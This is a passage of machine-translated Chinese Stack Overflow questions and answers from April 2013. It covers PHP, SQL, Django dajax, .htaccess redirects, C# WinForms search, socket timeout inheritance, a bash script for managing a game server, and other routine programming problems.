while ($row = @mysql_fetch_assoc($result)){
  // ADD TO XML DOCUMENT NODE
  $node = $doc->create_element("marker");
  $newnode = $parnode->append_child($node);

  $newnode->set_attribute("name", $row['name']);
  $newnode->set_attribute("address", $row['address']);
  $newnode->set_attribute("lat", $row['lat']);
  $newnode->set_attribute("lng", $row['lng']);
  $newnode->set_attribute("type", $row['type']);
} 
```

两个版本都显示[在这里](https://developers.google.com/maps/articles/phpsqlajax_v3?hl=ja)

# django - 为什么 dajax 不分配工作？

> ID：16215269
> 
> 赞同：0
> 
> 时间：2013-04-25T12:52:20.263
> 
> 标签：django, assign, dajax

要么我没有看到明显的东西，要么基本的东西一定是错的。我正在玩`dajax`，首先一切似乎都正常。那就是警报“Hello world”测试通过了。但是由于某种原因，我无法使该`assign`功能正常工作。我还在shell中测试了调用，那里没有问题。

ajax.py

```
from dajax.core import Dajax
from dajaxice.decorators import dajaxice_register

@dajaxice_register
def sayhello(request, pk):
    dajax = Dajax()

    dajax.alert(pk) #works
    dajax.assign('#ajaxize', 'innerHTML', 'invalid') #doesn't work
    return dajax.json() 
```

HTML

```
<div id="ajax"><span id="ajaxize"></span></div> 
```

我确实[在这个博客上](http://simonsstuffandthings.blogspot.nl/2012/05/installation-and-use-of-dajax-and.html)`{% load dajaxice_templatetags %}`包含了和其他所有建议。

**编辑**

我忘了提：我的浏览器调试器说“ReferenceError：找不到变量：clear_quotes”

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-01-29T18:40:15.130

好吧，我遇到了同样的问题，我唯一做的就是删除使用“clear_quotes”的行。之后，代码起作用了。

您必须创建一个虚拟环境来进行更改。

# .htaccess - .htaccess 重定向此目录中的所有文件

> ID：16215272
> 
> 赞同：0
> 
> 时间：2013-04-25T12:52:27.933
> 
> 标签：.htaccess, redirect

我在 wordpress 插件中移动了一个电子邮件缓存目录，我想在**旧**目录中保留一个 .htaccess 文件以重定向到新目录

我已经认真地用谷歌搜索，找不到可以将当前目录中的文件重定向到新目录的答案。为简单起见，htaccess 必须在旧目录中

siteurl/wp-content/plugins/church-admin-cache/ 到 siteurl/wp-content/uploads/church-admin-cache/

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-25T12:59:46.360

RedirectPermanent 应该可以完成这项工作。

```
RedirectPermanent /wp-content/plugins/church-admin-cache/ /wp-content/uploads/church-admin-cache/ 
```

# jquery - 如何在使用按钮单击打印 SSRS 报告时显示打印对话框以选择打印机

> ID：16215274
> 
> 赞同：0
> 
> 时间：2013-04-25T12:52:33.117
> 
> 标签：jquery, asp.net-mvc, reporting-services

我通过将参数传递给 Window.open() 来调用 aspx 报告查看器页面，例如

```
var popUpWindow = window.open('@Url.Content("~/rptViewer.aspx")' + "?date=" + date,'popUpWindow', 'channelmode=yes,resizable=yes,scrollbars=yes,toolbar=no,menubar=no,location=no,directories=no,status=no'); 
```

我正在使用 ReportPrintDocument.cs 打印报告，例如

```
ReportPrintDocument RP = new ReportPrintDocument(reportViewerPrint.ServerReport);RP.Print(); 
```

这样，报告将直接打印，而不显示任何打印对话框。

现在我想显示用于选择打印机的打印对话框和要打印的副本数。在单击打印对话框上的“确定”按钮后，我必须打印报告……根据在打印对话框中选择的选项

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T20:00:41.997

您当前正在打印报表*服务器端*（如果您正在开发，它可能与浏览器所在的机器相同），它无法显示任何打印对话框。换句话说，它实际上不是当前正在打印的客户端。

要打印新打开的窗口，您需要一些 Javascript 来执行客户端打印。有关详细信息，请参阅[此相关问题](https://stackoverflow.com/a/6334656/419956)或直接参考[提到的 MSDN 博客文章](http://blogs.msdn.com/b/selvar/archive/2011/04/09/invoking-the-print-dialog-for-report-viewer-2010-control-using-the-javascript-api.aspx)。

# mysql - 试图计算并加入两个 mysql 表

> ID：16215279
> 
> 赞同：0
> 
> 时间：2013-04-25T12:52:44.417
> 
> 标签：mysql, sql, join, count

我有一个带有两个表的 mysql 数据库：

数据库名称

```
name | Level
------------
bob    4
john   3
andy   2
dave   1 
```

数据库数据

```
entry | user
------------
dfds    bob
hdes    bob
sers    john
iuid    dave
yyuy    john 
```

我正在尝试计算每个用户输入的条目数并显示他们的级别。所以 lit 看起来像这样：

```
count(*) | user | Level
-----------------------
2         bob     4
2         john    3
1         dave    1 
```

我尝试使用左连接和不同连接，但似乎可以掌握逻辑。帮助将不胜感激

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-25T12:54:12.107

您基本上需要使用连接表，`INNER JOIN`因为您只想显示两个表上都存在的记录。要计算它们的实例数，您需要使用聚合函数`COUNT()`和`GROUP BY`子句。

```
SELECT  COUNT(*) TotalCount,
        a.Name,
        a.Level
FROM    names a
        INNER JOIN data b
            ON a.Name = b.user
GROUP   BY a.Name, a.Level 
```

*   [SQLFiddle 演示](http://www.sqlfiddle.com/#!2/7225d/3)

要进一步了解有关联接的更多信息，请访问以下链接：

*   [SQL 连接的可视化表示](http://www.codinghorror.com/blog/2007/10/a-visual-explanation-of-sql-joins.html)

输出

```
╔════════════╦══════╦═══════╗
║ TOTALCOUNT ║ NAME ║ LEVEL ║
╠════════════╬══════╬═══════╣
║          2 ║ bob  ║     4 ║
║          2 ║ john ║     3 ║
║          1 ║ dave ║     1 ║
╚════════════╩══════╩═══════╝ 
```

# php - 如何在 MantisBT 中自定义过滤错误

> ID：16215281
> 
> 赞同：1
> 
> 时间：2013-04-25T12:52:51.147
> 
> 标签：php, mantis

我只想通过定义的自定义过滤器过滤 MantisBT 1.2.14 中的*错误*。我可以使用从数据库中加载过滤器

```
$t_filter = filter_ensure_valid_filter( filter_get_row($t_filter_id) ); 
```

然后我尝试通过这个过滤器获取行：

```
$t_rows = filter_get_bug_rows( $f_page_number, $t_per_page, 
                               $t_page_count,$t_bug_count, $t_filter ); 
```

具有所有参数但`$t_filter`等于`null`。事实证明，总是加载所有错误。

我试过

```
$t_rows = filter_get_bug_rows( $f_page_number, $t_per_page, $t_page_count, 
                               $t_bug_count, $t_filter, $t_filter['project_id'] ); 
```

这应该将项目设置为过滤，但没有成功。

`view_all_bug_page.php`我也尝试像在螳螂中那样做：

```
$t_rows = filter_get_bug_rows( $f_page_number, $t_per_page, $t_page_count, 
                               $t_bug_count, null, null, null, true ); 
```

但是在这里（我猜）它还使用缓存中的*当前项目*进行过滤。

是否可以仅对MantisBT**中的错误使用高级自定义过滤器，以及如何使用？**

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-06-06T11:48:14.117

解决方案是：**必须使用**`$t_filter`数组中的过滤器字符串。

```
# get filter string
$t_filter_string = explode('#', $t_filter['filter_string'], 2);

# get bug rows with unserialized filter string
$t_rows = filter_get_bug_rows($f_page_number, $t_per_page, $t_page_count, 
                              $t_bug_count, unserialize($t_filter_string[1]),
                              helper_get_current_project()); 
```

因此返回想要的行，另外当前项目用于过滤。

# r - R 处的 sem 函数错误：因素的差异

> ID：16215282
> 
> 赞同：1
> 
> 时间：2013-04-25T12:52:54.367
> 
> 标签：r, structural-equation-model

我想在 R 中的数据上使用函数 sem（带有 lavaan 包）：

```
Model1<- 'Transfer~Amotivation+Gender+Age
Amotivation~Gender+Age

transfer are 4 questions with a 5 point likert scale 
Amotivation: 4 questions with a 5 pint likert scale
Gender: 0 (=male) and 1 (=female)
Age: just the different ages 
```

我得到了下一个错误：

```
in getDataFull (data= data, group =  group, grow.label = group.label,:
lavaan WARNING: some observed variances are (at least) a factor 100 times larger than others; please rescale 
```

有人熟悉这个错误吗？它会影响我的结果吗？我需要改变什么吗？我真的不知道这个错误是什么意思。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-05-14T20:17:00.033

你的秤不等价。您的性别变量被限制为 0 或 1。动机被限制在 1 到 5 之间，但年龄的限制更少。我为性别、年龄和动机创建了一些样本数据。您可以看到年龄变量的方差比性别的方差高 4,000 多倍，比样本动机数据高约 500 倍。

```
gender  <- c(0,1,1,1,0,0,1,1,0,1,1,0,0,1,1,1)
age <- c(18,42,87,12,24,26,98,84,23,12,95,44,54,23,10,16)
set.seed(42)
amotivation <- rnorm(16, 3, 1.5)
var(gender)      #    0.25 variance
var(age)         # 1017.27 variance
var(amotivation) #    2.21 variance 
```

我不确定不等方差如何影响您的结果，或者您是否需要做任何事情。为了使您的年龄变量更接近动机量表，您可以转换数据，使其也是 5 点量表。

```
newage <- age/max(age)*5
var(newage) # 2.65 variance 
```

您可以尝试以两种方式运行分析（使用原始数据和转换后的数据），看看是否存在差异。

# php - 获取数据库中所有表的列表和列信息

> ID：16215283
> 
> 赞同：0
> 
> 时间：2013-04-25T12:52:58.877
> 
> 标签：php, mysql, database, pdo, zend-framework2

我正在尝试获取 ZF2 中当前配置的数据库的所有信息。基本上我可以通过查询来做到这一点。例如。：

```
SELECT * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA = '<databasename>' 
```

.. 等等。

我想要的是使用像 PDO 这样的东西来为我提供这个信息（类似的东西`$db->fetchAll(\PDO::FETCH_COLUMN)`）。这是因为我希望它可以与不同类型的数据库（mysql、sqlite 等）一起使用。

有什么办法可以使用 zend 的 dbAdapter 或从 zend 2 框架访问的任何东西来做到这一点？目前我正在研究如何获取一个 PDO 实例并使用它来完成它，但是从我所看到的 ZF2 包中包含的内容中不会发生这种情况。

# php - 合并 preg_match_all 和 preg_replace

> ID：16215290
> 
> 赞同：0
> 
> 时间：2013-04-25T12:53:23.837
> 
> 标签：php, preg-replace, preg-match-all

我有一些代码正在运行，它找出字符串中的主题标签并将它们转换为链接。我已经使用`preg_match_all`如下所示完成了此操作：

```
if(preg_match_all('/(#[A-z_]\w+)/', $postLong, $arrHashTags) > 0){
foreach ($arrHashTags[1] as $strHashTag) {
  $long = str_replace($strHashTag, '<a href="#" class="hashLinks">'.$strHashTag.'</a>', $postLong);

    }   
} 
```

此外，对于我的搜索脚本，我需要在结果字符串中将搜索到的关键字加粗。类似于下面的代码使用`preg_replace`：

```
$string = "This is description for Search Demo";
$searchingFor = "/" . $searchQuery . "/i";
$replacePattern = "<b>$0<\/b>";
preg_replace($searchingFor, $replacePattern, $string); 
```

我遇到的问题是两者必须一起工作，并且应该作为一个**组合结果**抛出。我能想到的一种方法是`preg_match_all`使用`preg_replace`代码运行生成的字符串，但是如果标签和搜索的字符串相同怎么办？第二个块也会加粗我的标签，这是不需要的。

**根据下面给出的答案更新**我正在运行的代码，但它仍然不起作用

```
if(preg_match_all('/(#[A-z_]\w+)/', $postLong, $arrHashTags) > 0){
foreach ($arrHashTags[1] as $strHashTag) {
  $postLong = str_replace($strHashTag, '<a href="#" class="hashLinks">'.$strHashTag.'</a>', $postLong);

    }   
} 
```

紧接着，我运行这个

```
 $searchingFor = "/\b.?(?<!#)" . $keystring . "\b/i";
 $replacePattern = "<b>$0<\/b>";
 preg_replace($searchingFor, $replacePattern, $postLong); 
```

只是让你知道，这一切都在一个`while`循环中，它正在生成列表

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-25T15:55:19.247

您只需要修改搜索模式以避免以“#”开头的搜索模式

```
$postLong = "This is description for Search Demo";

if(preg_match_all('/(#[A-z_]\w+)/', $postLong, $arrHashTags) > 0){
  foreach ($arrHashTags[1] as $strHashTag) {
    $postLong = str_replace($strHashTag, '<a href="#" class="hashLinks">'.$strHashTag.'</a>', $postLong);
  }
}

#  This expression finds any text with 0 or 1 characters in front of it
# and then does a negative look-behind to make sure that the character isn't a #
searchingFor = "/\b.?(?<!#)" . $searchQuery . "\b/i";
$replacePattern = "<b>$0<\/b>";
preg_replace($searchingFor, $replacePattern, $postLong); 
```

或者，如果您出于其他原因不需要可用哈希数组，则可以仅使用 preg_replace。

```
$postLong = "This is description for #Search Demo";

$patterns = array('/(#[A-z_]\w+)/', "/\b.?(?<!#)" . $searchQuery . "\b/i");
$replacements = array('<a href="#" class="hashLinks">'.$0.'</a>', ' "<b>$0<\/b>');
preg_replace($patterns, $replacements, $postLong); 
```

# sql - sql结合两列，其中一列是日期时间

> ID：16215293
> 
> 赞同：2
> 
> 时间：2013-04-25T12:53:37.307
> 
> 标签：sql, sql-server-2008, datetime

我有以下 sql 代码（ms sql server 2008）

```
select (analysisno + ' ' + '-' + ' ' + description + ' ' + '-' + ' ' + formdate) as columnA 
```

从 Old_Analysis_Data 按格式排序

*从字符串转换日期和/或时间时*出现以下错误转换失败。

 *AnalysisNo 是 varchar(10) 描述是 varchar(500) formdate 是日期时间（不是我的表，它是旧表）

任何想法，因为无法在谷歌上找到答案。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T13:02:04.843

在连接之前使用 Convert 将时间转换为字符串：

```
SELECT ( analysisno + ' ' + '-' + ' ' + description + ' ' + '-' + ' ' 
     + CONVERT(VARCHAR(20), formdate, 100) ) AS columnA 
FROM 
     Old_Analysis_Data 
ORDER BY 
     formdate 
```

在这种情况下， 100 是将日期戳格式设置为 mon dd yyyy hh:miAM （或 PM）作为示例的样式

见 [http://www.w3schools.com/sql/func_convert.asp](http://www.w3schools.com/sql/func_convert.asp)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-25T12:55:01.573

试试这个：

```
select (analysisno + ' - ' + description + ' - ' 
+ convert(varchar(100),formdate)) as columnA
from Old_Analysis_Data order by formdate 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-25T13:02:05.167

而不是`formdate`直接连接，先将其转换为字符串，

```
convert(varchar(15), formdate, 103) 
```

它为您提供以下格式

```
dd/MM/yyyy 
```*

# html - 允许背景溢出？

> ID：16215295
> 
> 赞同：0
> 
> 时间：2013-04-25T12:53:43.567
> 
> 标签：html, css, background, background-image

我有如下背景：

![在此处输入图像描述](https://i.stack.imgur.com/ftW5z.png)

问题是我想将包含框的宽度设置为仅覆盖到白色区域的末端，因此阴影应该“溢出”。我不想使用 out 容器或填充，因为我试图避免额外的宽度；如果背景溢出，则浏览器不会创建水平；滚动条，这正是我想要的。

有什么办法可以做到这一点，还是我会被迫使用全宽？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-25T13:23:37.077

背景`<body>`不影响滚动条，因此根据您需要阴影的内容，您可能可以执行类似的操作；

```
body {
    background: url(http://i.stack.imgur.com/ftW5z.png) no-repeat center top;
    margin: 0;
}
.container {
    width: 1014px; /* inner space of shadow image */
    margin: 35px auto; /* 35px matches size of top shadow */
} 
```

演示在[http://jsfiddle.net/gjsxn/2/](http://jsfiddle.net/gjsxn/2/)

您可能会使用另一个容器并使用 min-width 和 overflow hidden 来实现相同的效果。

# java - 如何向 JFrame 添加颜色指示器（类似 LED）？

> ID：16215307
> 
> 赞同：1
> 
> 时间：2013-04-25T12:54:23.943
> 
> 标签：java, swing, jframe

我想在我的 JFrame 中添加一个颜色指示器。当我点击一个按钮时它应该变成红色，如果我不点击一个按钮它应该是绿色的。我应该如何实现这个？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-04-25T13:12:45.183

```
JLabel lblLed = new JLabel("•");
lblLed.setForeground(Color.Green); 
```

将 ChangeListener 添加到您的 JButton 并在 StateChanged() 方法中添加：

```
if (buttonIsPressed) {
    lblLed.setForeground(Color.Red);
} else {
    lblLed.setForeground(Color.Green);
} 
```

# c++ - 为什么 SO_RCVTIMEO 从侦听套接字继承到接受的套接字？

> ID：16215309
> 
> 赞同：1
> 
> 时间：2013-04-25T12:54:33.233
> 
> 标签：c++, python, linux, sockets

除了一些 Python 文档之外，我找不到任何关于此的[文档](http://docs.python.org/3.4/library/socket.html)

> 18.1.4.2。超时和接受方法
> 
> 如果`getdefaulttimeout()`不是`None`，则该方法返回的套接字`accept()`继承该超时。否则，行为取决于侦听套接字的设置：
> 
> 如果监听套接字处于阻塞模式或超时模式，则返回的套接字`accept()`处于阻塞模式；
> 
> 如果侦听套接字处于非阻塞模式，则返回的套接字`accept()`是处于阻塞模式还是非阻塞模式取决于操作系统。如果您想确保跨平台行为，建议您手动覆盖此设置。

我已阅读此 [问题]：[套接字选项是否从侦听套接字跨接受（）继承？](https://stackoverflow.com/questions/5968132/are-socket-options-inherited-across-accept-from-the-listening-socket?rq=1)，我认为最终的判决仍然是实现定义的。我想在平台上进行测试比从每个内核读取源代码更容易。

这里清楚地表明超时选项是继承的。但是在 accept(2) 的联机帮助页上，没有提到这一点。当我在我的一个盒子（嵌入式 Linux 盒子）上调试一些 C++ 代码时，我发现这非常令人震惊。我希望接受的套接字不会继承此选项。

我在哪里可以找到这个问题的明确答案？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-25T13:06:35.970

如果这是一个 C 问题，而不是 Python 问题，我不会根据 Python 文档得出关于`SO_RCVTIMEO`被继承的任何结论。`accept(2)`我想你可能已经误解了 Python 文档，因为它们......

1.  从不明确提及该`SO_RCVTIMEO`选项
2.  永远不要说超时值是从监听套接字继承的，而是从设置的全局超时值`setdefaulttimeout()`

查看 的源代码[`socketmodule.c`](http://svn.python.org/view/python/trunk/Modules/socketmodule.c?revision=81029&view=markup)，Python 甚至没有使用`SO_RCVTIMEO`socket 选项。相反，它将超时值存储在它自己的套接字对象的内部表示中，并在对`select(2)`and的调用中使用它`poll(2)`。

我怀疑 Python 有点奇怪的实现的基本原理是它被设计为在许多平台上运行，其中一些平台不支持该`SO_RCVTIMEO`选项。唯一的参考`SO_RCVTIMEO`是在第 4773 行...

```
#ifdef SO_RCVTIMEO
PyModule_AddIntConstant(m, "SO_RCVTIMEO", SO_RCVTIMEO);
#endif 
```

...它被预处理器指令包围的地方，以防`SO_RCVTIMEO`在编译它的平台上没有定义。

至于为什么 Python 文档说...

> ...方法返回的套接字`accept()`继承该超时...

...这是因为 Python 的内部实现`accept()`显式地将新套接字的内部超时值设置为第 732 行的默认超时值...

```
s->sock_timeout = defaulttimeout; 
```

至于原来的问题...

> 我在哪里可以找到这个问题的明确答案？

...我想你必须在内核源代码中寻找它直到你找到它，但它可能更简单只是不对继承的内容做任何假设，并明确覆盖你从父套接字 FD 上的默认值更改的任何选项在 . 返回的新套接字 FD 上`accept(2)`。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-25T22:31:20.773

BSD 套接字 API 执行此操作。接受的套接字继承了侦听套接字的所有内容：接收缓冲区大小、超时、KEEPALIVE、close-on-exec。一些更高级别的 API（如 Java）会做更多的工作来撤销它，例如读取超时。

# bash - 通过 .sh 脚本将命令传递给命名屏幕会话

> ID：16215312
> 
> 赞同：0
> 
> 时间：2013-04-25T12:54:42.673
> 
> 标签：bash, shell

我完全是初学者，我用谷歌搜索了一些 if elseif else 教程并开始构建这个脚本。我正在尝试创建一个 .sh 脚本，它让我可以选择从 PHP 脚本管理我的阀门源服务器。这是我目前拥有的：

```
#!/bin/sh
# CONFIG
LOGFILE="/var/www/management/ifacelog"
NEWDATE=`TZ=GMT-3 date +%d.%m.%Y" "%H:%M:%S`
# END OF CONFIG
SCRIPTCOMMAND=$1
CSGOCOMMAND=$2
if [ $SCRIPTCOMMAND = "START" ] ; then
        echo $NEWDATE  "SERVER STARTED! connect cs.kask.fi; password gd | rcon_password tuksu" >> test
        touch lockfile
        screen -A -m -d -S csgo -L /home/csgo/server/srcds_run -game csgo -console -usercon -tickrate 128 +net_public_adr 46.246.93.192 +ip 46.246.93.192 +tv_port 27010 -maxplayers_override 11 +game_type 0 +game_mode 1 +host_worksh$
elif [ $SCRIPTCOMMAND = "RESTART" ] ; then
        echo $NEWDATE  "STOPPING THE SERVER" >> test
        echo $NEWDATE  "Passing command tv_stoprecord and waiting 10sec." >> test
        screen -S csgo -X stuff "tv_stoprecord"
        screen -S csgo -X stuff "
"
sleep 10
        echo $NEWDATE  "Passing command: quit" >> test
        screen -S csgo -X stuff "quit"
        screen -S csgo -X stuff "
"
        echo $NEWDATE  "SERVER RESTARTED!" >> test
elif [ $SCRIPTCOMMAND = "KILL" ]; then
        echo $NEWDATE  "KILLING SERVER!" >> test
        pkill srcds_run
        rm lockfile
        rm screenlog.0
elif [ $SCRIPTCOMMAND = "RCON" ]; then
        echo $NEWDATE  "REMOTE RCON! Passing value: " $2 $3 >> test
        screen -X -S csgo -p 0 stuff $2 $3
        screen -S csgo -X stuff "
"
elif [ $SCRIPTCOMMAND = "RESET" ]; then
        rm lockfile
        rm screenlog.0
else
        echo "UNKNOWN COMMAND WAS PASSED!"
fi 
```

除了将命令传递给屏幕会话本身（如果 scriptcommand = RCON）之外，一切正常。如果我输入 shell `screen -X -S csgo -p 0 stuff say test`，它会正确地将其传递给屏幕会话。如果我运行我的脚本`./csgo.sh RCON say test`，屏幕会显示错误`-X: stuff: invalid option "say"`。我也尝试过，`screen -X -S csgo -p 0 stuff \"$2\"`但这没有任何区别。

由于如果我手动键入它可以正常工作，我不知道为什么它不能在脚本上工作。知道为什么它不起作用以及如何解决它吗？

# javascript - sencha touch 在按钮的选项卡上隐藏和显示组件

> ID：16215315
> 
> 赞同：2
> 
> 时间：2013-04-25T12:54:53.050
> 
> 标签：javascript, extjs, sencha-touch, sencha-touch-2, sencha-touch-2.1

我创建了一个带有一些视图的应用程序，左上角还有一个列表按钮，用于在点击事件时显示和隐藏列表。一些我如何能够将它隐藏在选项卡上但不知道如何再次显示它。默认情况下它应该是隐藏的，但是点击那个按钮它应该隐藏并根据当前属性显示它自己。

```
iconCls: 'list',
iconMask: true,
ui: 'plain',
handler: function() {
        Ext.getCmp('ext-ListNavigation-1').hide();
            } 
```

并列出查看代码

```
Ext.define('ov_app.store.NavigationItems', {
    extend: 'Ext.data.Store',
config:{
    model: 'ov_app.model.Items', 
    data:[
        { items:"Services"},
        { items:"Solutions"},
        { items:"About Us"},
        { items:"Why Singapore"},
        { items:"Contact Us"}
    ]
}
}); 
```

用户界面看起来像这样 ![在此处输入图像描述](https://i.stack.imgur.com/vz0Ls.png)

如您所见，点击列表上方的列表按钮可以隐藏和显示什么（服务、解决方案等）。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-25T14:48:31.670

```
var list = Ext.getCmp('ext-ListNavigation-1');

if (list.isHidden()) {
  list.show();
}
else {
  list.hide();
} 
```

# asp.net-mvc-4 - 无法访问 SimpleMembershipProvider 角色

> ID：16215316
> 
> 赞同：0
> 
> 时间：2013-04-25T12:54:59.157
> 
> 标签：asp.net-mvc-4, forms-authentication, roles, simplemembership

我有 MVC4 应用程序，它使用 SimpleMEmbershipProvider 进行身份验证机制。

一切正常，除了当我返回应用程序并使用持久 cookie 进行身份验证时。

我已通过身份验证，但无法访问分配给我的角色。实际上，根本无法访问角色：

```
string.Join(",", Roles.GetRolesForUser(User.Identity.Name)) 
```

返回空字符串

可能是什么原因造成的？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-25T15:36:39.617

当 SimpleMembershipProvider 尚未初始化时，可能会发生这种情况。示例 MVC 表单身份验证模板假定您将允许匿名访问您的站点，并且在您进入登录页面之前不会初始化成员资格提供程序。但是，一种更常见的安全技术是要求登录才能访问任何站点，并在 _layout 页面中定义由角色确定的菜单选项。但是，如果您使用持久性 cookie，则不会重新访问登录页面，因此不会从成员数据库中加载经过身份验证的用户的角色。

您要做的是在用户进入站点时初始化提供程序，以便加载值。为此，您需要在 App_Start 文件夹中 FilterConfig 类的 RegisterGlobalFilters 方法中添加以下过滤器

```
filters.Add(new YourAppNameSpace.Filters.InitializeSimpleMembershipAttribute()); 
```

当通过 cookie 验证的用户进入站点时，这将导致从数据库加载用户数据。

另一种替代技术是将 [InitializeSimpleMembership] 装饰器添加到通过 cookie 身份验证的用户可能直接输入的任何控制器方法中。如果你必须把它放在很多控制器上，这有点乱。因此，在大多数情况下，将其放在全局过滤器中会更好。

# html - 为什么照片周围有一个模糊的边框？

> ID：16215318
> 
> 赞同：-1
> 
> 时间：2013-04-25T12:55:02.877
> 
> 标签：html, css, image

我正在向此页面添加内容：[http](http://rouviere.com/index-new) ://rouviere.com/index-new出于某种原因，顶部的插图周围有一个模糊的边框。

这是html：

```
<div class="illustration">
    <img class="promo" src="http://www.rouviere.com/_photos/slides_photos.jpg" alt="we package it up" />
</div><!-- end #illustration -->

<div class="headline">
    <h2>Photos</h2>
<p id="sub-head">Show the magic of your world with fine photos</p>
</div> 
```

这是CSS：

```
p#sub-head  { font-size: 24px; margin: 0 0 10px 35px; color: #000; }
img.promo   { float: right; margin-right: 20px; z-index: 0;   } 
```

我尝试添加边框：无；到图像，但它没有任何区别。

我将不胜感激任何有关解决方案的指导。

谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-25T12:56:59.863

边框在图像本身上。

![在此处输入图像描述](https://i.stack.imgur.com/8fDlZ.jpg)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-10-27T02:24:50.830

实际上，我找到了一个可能对您有用的答案。使用以下代码：

边框：0px 实心#cccccc ！重要；

它让它对我来说消失了，但是，如果你使用 box-shadow 功能，你仍然会在阴影渲染的一侧看到一个边框空间。

希望有帮助

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-25T14:42:05.660

这是一个合理的问题。谷歌有多个页面的人问同样的问题。这是一个自 CS3 以来一直存在的 Photoshop 错误，它为下采样的图像添加了模糊的边框。

解决方案是如果图像被下采样，则移除背景，以便隔离图像位于透明背景上。

# c# - 当用户在文本框中输入内容时，提供即时搜索功能的最佳方式是什么

> ID：16215319
> 
> 赞同：0
> 
> 时间：2013-04-25T12:55:04.120
> 
> 标签：c#, winforms, textbox

我希望用户按姓名或员工编号搜索员工。然后我提供了一个文本框。因此，当用户在文本框中键入时，我处理 _TextChanged 事件并使用员工列表更新 dataGridview，其中员工姓名或员工编号包含用户在文本框中输入的文本。

遇到的问题是这会减慢输入速度和 datagridview 更新，因为每次文本框中的文本更改时，我的搜索查询都会命中数据库。这使得表单有些反应迟钝。

有人知道更好的方法吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-25T13:09:44.377

*   **很简单：**延迟查询数据库半秒或秒，以确保用户通过记住上次更改某些文本的时间来停止输入。
*   **从长远来看更好：**如果数据库查询需要很长时间（超过一秒），那么您可以将查询数据库外包给另一个线程（任务或后台工作人员）。如果数据太多以至于绘制需要很长时间，您甚至可以在自己的任务中填充 DataGrid。此外，您将能够实现一些取消机制，并且您的主要 GUI 元素保持响应。

我在下面的演示代码中想到了类似的东西：

```
using System;
using System.Collections.Generic;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace WindowsFormsApplication19
{
    public partial class Form1 : Form
    {
        CancellationTokenSource tokenSource = new CancellationTokenSource();

        public Form1()
        {
            InitializeComponent();
        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {
            // cancel old query and datagrid update
            tokenSource.Cancel();

            tokenSource = new CancellationTokenSource();
            var token = tokenSource.Token;

            Task.Factory.StartNew((s) =>
                {
                    var q = Task.Factory.StartNew<IEnumerable<DemoData>>(() => LongLastingDataQuery(textBox1.Text, token), token);
                    if (!token.IsCancellationRequested)
                        Task.Factory.StartNew(() => BindData(q.Result));
                }, token);
        }

        private IEnumerable<DemoData> LongLastingDataQuery(string search, CancellationToken token)
        {
            List<DemoData> l = new List<DemoData>();
            for (int i = 0; i < 10000 * search.Length; i++)
            {
                if (token.IsCancellationRequested)
                    return l;

                l.Add(new DemoData { ID = i, Text = search + i, Text1 = search + i + i, Text2 = search + i + i + i, Text3 = search + i + i + i + i });
            }
            Thread.Sleep(1000);
            return l;
        }

        private void BindData(IEnumerable<DemoData> enumerable)
        {
            if (dataGridView1.InvokeRequired)
                dataGridView1.Invoke(new MethodInvoker(() => BindData(enumerable)));
            else
            {
                demoDataBindingSource.DataSource = null;
                demoDataBindingSource.DataSource = enumerable;
            }
        }

        public class DemoData
        {
            public string Text { get; set; }
            public string Text1 { get; set; }
            public string Text2 { get; set; }
            public string Text3 { get; set; }
            public int ID { get; set; }
        }
    }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-25T14:01:00.113

我有两个建议给你：

1.  处理“TextBox enter KeyPressdown”事件而不是TextChange事件，因此该事件仅在您键入查询后按下“Return”键时触发。示例代码是这样的：

    ```
    private void searchTextBox_KeyPress(object sender, KeyPressEventArgs e)
    {
        if (e.KeyChar == (char)Keys.Return)
        {
            // DoQueryAndRebindEmployees(searchTextBox.Text);
        }
    } 
    ```

2.  如果您坚持在 TextChange 事件中处理，请将数据库搜索代码放在另一个线程中，例如在 BackgroundWorker 线程中，在 TextChange 事件处理程序中：

    ```
     BackgroundWorker employeeQueryWorker = new BackgroundWorker();
        employeeQueryWorker.DoWork += new DoWorkEventHandler(employeeQueryWorker_DoWork);
        employeeQueryWorker.RunWorkerCompleted += new RunWorkerCompletedEventHandler(employeeQueryWorker_RunWorkerCompleted);
        employeeQueryWorker.RunWorkerAsync(searchTextBox.Text); 
    ```

Backgroundwork线程和UI线程之间的通信，可以定义一个类的成员变量来表示员工查询结果，比如

```
 private IList<Employee>  m_employeeQueryResult = null; 
```

然后在employeeQueryWorker_DoWork(object sender, DoWorkEventArgs e) 线程方法中，执行耗时的数据库查询并将查询结果存储到 m_employeeQueryResult 中。

最后，在employeeQueryWorker_RunWorkerCompleted() 方法中，将m_employeeQueryResult 与DataGridView 控件绑定。

这将使 UI 控件保持响应。

# vector - TinyOs 中的交叉产品？

> ID：16215323
> 
> 赞同：0
> 
> 时间：2013-04-25T12:55:11.377
> 
> 标签：vector, tinyos, nesc, cross-product

如何在[Tinyos](http://www.tinyos.net/) (nesC)中的两个向量之间进行[叉积？](http://en.wikipedia.org/wiki/Cross_product)

如果我有`position=p1+x*ex+y*ey;`；其中 ex,ey: 是向量。

我正在寻找，但找不到任何帮助！

那么有什么有用的方法可以做到这一点吗？如果我去定义叉积有一个我现在不知道的角度如何从两个向量中得到它？

* * *

## 回答 #1

> 赞同：0
